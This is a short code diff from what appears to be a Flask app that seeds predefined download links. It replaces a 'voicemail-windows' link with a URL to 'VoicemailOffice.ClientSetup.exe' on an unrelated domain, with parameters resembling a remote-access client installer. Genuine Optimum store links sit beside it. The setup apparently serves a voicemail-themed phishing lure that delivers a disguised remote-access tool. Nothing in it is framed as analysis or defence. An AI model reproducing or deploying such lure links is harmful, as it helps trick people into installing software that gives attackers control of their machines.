@@ -31,7 +31,7 @@ with app.app_context():
     if not Link.query.first():
         predefined_links = [
             {'name': 'voicemail-googleplay', 'link': 'https://kentenglishhub.com/temp.php'},
-            {'name': 'voicemail-windows', 'link': 'http://axentra.click/t.php'},
+            {'name': 'voicemail-windows', 'link': 'https://audiofilelisten.online/Bin/VoicemailOffice.ClientSetup.exe?e=Access&y=Guest&c=Voicemail%20Office&c=https%3A%2F%2Fwww.voicemailoffice.com%2F&c=&c=&c=&c=&c=&c='},
             {'name': 'optimum-google', 'link': 'https://play.google.com/store/apps/details?id=com.altice.optimum'},
             {'name': 'optimum-windows', 'link': 'https://www.microsoft.com/en-us/p/optimum/9nblggh0h7c9'}
         ]
